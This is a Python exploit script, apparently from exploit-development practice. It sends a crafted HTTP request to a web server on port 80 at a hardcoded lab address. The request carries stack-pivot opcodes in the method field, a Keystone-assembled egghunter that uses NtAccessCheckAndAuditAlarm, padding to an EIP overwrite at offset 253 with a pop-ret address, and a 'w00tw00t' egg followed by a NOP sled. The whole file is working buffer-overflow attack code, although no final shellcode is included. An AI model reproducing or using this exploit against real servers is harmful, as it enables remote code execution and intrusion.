#!/usr/bin/env python3

import socket
import sys
import keystone
import subprocess
from struct import pack

try:
    if len(sys.argv) < 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]
    port = 80
    size = 260
    bad_char_values = b"\x00\x25\x0a\x0d"
    eip_offset = 253

    # Egghunter code.
    CODE = (
        # We use the edx register as a memory page counter
        "							 "
        "	loop_inc_page:			 "
        # Go to the last address in the memory page
        "		or dx, 0x0fff		;"
        "	loop_inc_one:			 "
        # Increase the memory counter by one
        "		inc edx				;"
        "	loop_check:				 "
        # Save the edx register which holds our memory 
        # address on the stack
        "		push edx			;"
        # Push the negative value of the system 
        # call number
        "		mov eax, 0xfffffe3a	;"
        # Initialize the call to NtAccessCheckAndAuditAlarm
        "		neg eax				;"
        # Perform the system call
        "		int 0x2e			;"
        # Check for access violation, 0xc0000005 
        # (ACCESS_VIOLATION)
        "		cmp al,05			;"
        # Restore the edx register to check 
        # later for our egg
        "		pop edx				;"
        "	loop_check_valid:		 "
        # If access violation encountered, go to n
        # ext page
        "		je loop_inc_page	;"
        "	is_egg:					 "
        # Load egg (w00t in this example) into 
        # the eax register
        "		mov eax, 0x74303077	;"
        # Initializes pointer with current checked 
        # address 
        "		mov edi, edx		;"
        # Compare eax with doubleword at edi and 
        # set status flags
        "		scasd				;"
        # No match, we will increase our memory 
        # counter by one
        "		jnz loop_inc_one	;"
        # First part of the egg detected, check for 
        # the second part
        "		scasd				;"
        # No match, we found just a location 
        # with half an egg
        "		jnz loop_inc_one	;"
        "	matched:				 "
        # The edi register points to the first 
        # byte of our buffer, we can jump to it
        "		jmp edi				;"
    )

    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
    encoding, count = ks.asm(CODE)
    egghunter = b""
    for code in encoding:
        egghunter += code.to_bytes(1, "little")

    # Jump to the first stage.
    httpMethod = b"\x83\xC4\x46"  # add esp,byte +0x45
    httpMethod += b"\x83\xC4\x23"  # add esp,byte +0x23
    httpMethod += b"\x54"  # push esp"
    httpMethod += b"\xC3"  # ret
    httpMethod += b" /"

    # Execute egghunter
    inputBuffer = b"\x90" * 4
    inputBuffer += egghunter
    inputBuffer += b"\x41" * (eip_offset - len(inputBuffer))

    # EIP control To pop return -> 0x0041eb74
    inputBuffer += b"\x74\xeb\x41"

    httpEndRequest = b"\r\n\r\n"

    # Payload
    httpEndRequest += b"w00tw00t"
    httpEndRequest += b"\x90" * 32  # NOP sled
    payload = httpMethod + inputBuffer + httpEndRequest

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
